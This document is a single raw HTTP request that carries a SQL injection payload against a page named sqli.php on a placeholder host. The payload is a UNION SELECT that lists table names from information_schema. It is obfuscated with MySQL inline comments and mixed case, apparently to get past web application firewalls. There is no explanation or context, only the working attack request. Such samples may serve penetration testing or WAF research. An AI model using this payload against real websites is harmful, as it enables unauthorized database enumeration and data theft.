GET /sqli.php?id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM%20/*information_schema*/.tables%20/*!WHERE%20*/+/*!TaBlE_ScHeMa*/+like+database()--%20- HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
